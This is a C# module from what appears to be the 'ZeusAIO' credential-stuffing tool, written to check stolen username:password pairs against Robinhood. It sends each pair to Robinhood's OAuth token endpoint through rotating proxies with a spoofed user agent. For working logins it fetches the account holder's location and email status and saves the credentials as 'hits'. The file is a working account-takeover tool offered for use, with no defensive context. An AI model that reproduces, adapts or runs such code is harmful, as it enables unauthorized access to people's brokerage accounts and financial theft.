using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Robinhood
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.AddHeader("origin", "https://robinhood.com");
                            httpRequest.AddHeader("referer", "https://robinhood.com/");
                            httpRequest.AddHeader("x-robinhood-api-version", "1.411.9");
                            string str = "{\"grant_type\":\"password\",\"scope\":\"internal\",\"client_id\":\"c82SH0WZOsabOXGP2sxqcj34FxkvfnWRZBKlBjFS\",\"expires_in\":86400,\"device_token\":\"" + "b50a336c-7538-4ee6-9e20-6ba9d46123de" + "\",\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}";
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = httpRequest.Post("https://api.robinhood.com/oauth2/token/", str, "application/json").ToString();
                            {
                                if (strResponse.Contains("Unable to log in with provided credentials"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("200"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("access_token"))
                                {
                                    string access_token = Check.Parse(strResponse, "token\": \"", "\"");
                                    httpRequest.AddHeader("authorization", "Bearer " + access_token);
                                    string text3 = httpRequest.Get("https://api.robinhood.com/user/", null).ToString();
                                    string text4 = Check.Parse(text3, "locality\":\"", "\"");
                                    string text5 = Check.Parse(text3, "email_verified\":", ",\"");
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - ROBINHOOD] " + s[0] + ":" + s[1] + " | Location: " + text4 + " | Email Verified: " + text5, Color.Green);
                                    }
                                    Export.AsResult("/Robinhood_hits", s[0] + ":" + s[1] + " | Location: " + text4 + " | Email Verified: " + text5);
                                    return false;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}
